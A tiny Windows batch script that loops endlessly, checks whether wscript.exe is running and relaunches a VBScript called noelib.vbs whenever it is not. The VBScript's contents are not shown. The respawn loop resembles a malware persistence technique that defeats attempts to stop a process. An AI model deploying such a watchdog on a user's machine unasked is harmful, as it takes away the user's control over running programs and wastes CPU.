@echo off

:1
tasklist /FI "IMAGENAME eq wscript.exe" 2>NUL | find /I /N "wscript.exe">NUL
if "%ERRORLEVEL%"=="1" start noelib.vbs
goto 1